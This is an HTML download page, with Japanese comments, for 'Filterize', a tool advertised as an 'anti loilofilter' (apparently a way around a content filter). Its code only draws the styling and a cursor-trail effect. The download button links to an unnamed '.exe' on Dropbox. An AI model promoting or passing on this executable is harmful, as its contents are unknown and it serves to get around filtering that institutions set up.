<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Filterize - Download</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000; /* 画像が読み込まれるまでの背景色 */
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: 'Segoe UI', sans-serif;
        }

        /* 背景画像：画面全体に広げてぼかす */
        .bg-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: -2; /* コンテンツと残像の後ろに配置 */
            overflow: hidden;
        }

        .bg-image {
            width: 120%; /* ぼかしの端を隠すために少し大きく */
            height: 120%;
            position: absolute;
            top: -10%;
            left: -10%;
            background: url('背景.png') no-repeat center center;
            background-size: cover;
            filter: blur(20px) brightness(0.5); /* ぼかしと明るさの調整 */
        }

        /* 中央のコンテンツ */
        .content {
            text-align: center;
            z-index: 10;
            pointer-events: none; /* マウスイベントを透過させて残像に干渉させない */
        }

        h1 {
            font-size: clamp(3rem, 15vw, 6rem);
            margin: 0;
            font-weight: 800;
            /* ピンクのグラデーション文字 */
            background: linear-gradient(to bottom, #ffd1ff, #fbc2eb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            font-size: 1.2rem;
            color: rgba(255, 255, 255, 0.8);
            margin: 10px 0 40px 0;
            font-weight: 300;
        }

        /* ダウンロードボタン（画像通りのスタイル） */
        .btn {
            display: inline-block;
            padding: 18px 60px;
            border-radius: 15px;
            text-decoration: none;
            color: white;
            font-weight: bold;
            font-size: 1.2rem;
            /* ピンク〜紫のグラデーション */
            background: linear-gradient(135deg, #cf9fff 0%, #ff99cc 100%);
            box-shadow: 0 10px 30px rgba(207, 159, 255, 0.4);
            pointer-events: auto; /* ボタンだけはクリック可能にする */
            transition: 0.3s;
        }

        .btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(255, 153, 204, 0.6);
            filter: brightness(1.1);
        }

        /* 残像（トレイル）の要素 */
        .trail {
            position: fixed;
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background-color: rgba(255, 255, 255, 0.5);
            pointer-events: none; /* マウスイベントを透過させる */
            z-index: -1; /* 背景の前、コンテンツの後ろに配置 */
            transform: translate(-50%, -50%);
            transition: width 0.3s ease-out, height 0.3s ease-out, opacity 0.3s ease-out; /* 残像が消える際のアニメーション */
        }

        .trail.inactive {
            width: 0px;
            height: 0px;
            opacity: 0;
        }

    </style>
</head>
<body>

    <div class="bg-container">
        <div class="bg-image"></div>
    </div>

    <div class="content">
        <h1>Filterize</h1>
        <p class="subtitle">The best anti loilofilter</p>
        
        <a href="https://www.dropbox.com/scl/fi/jhjaiww74lcgo741zqnng/.exe?rlkey=tv4zztnvfql4sd4c4nfsncioz&st=vwymdduv&dl=1" class="btn">
            Download Now
        </a>
    </div>

    <script>
        const trailCount = 30; // 残像の数
        const trails = [];

        // 残像要素の生成
        for (let i = 0; i < trailCount; i++) {
            const trail = document.createElement('div');
            trail.classList.add('trail', 'inactive');
            document.body.appendChild(trail);
            trails.push(trail);
        }

        // カーソル移動に合わせて残像を動かす
        document.addEventListener('mousemove', (e) => {
            // 最も古い残像を取得して、新しい位置に配置
            const oldestTrail = trails.shift();
            oldestTrail.style.left = `${e.clientX}px`;
            oldestTrail.style.top = `${e.clientY}px`;
            oldestTrail.classList.remove('inactive'); // 活性化
            
            // 残像を最後尾に移動（次に取得するときに最も古い残像になる）
            trails.push(oldestTrail);

            // 一定時間後に非活性化（消えるアニメーション）
            setTimeout(() => {
                oldestTrail.classList.add('inactive');
            }, 300); // 消えるまでの時間（ミリ秒）
        });
    </script>

</body>
</html>
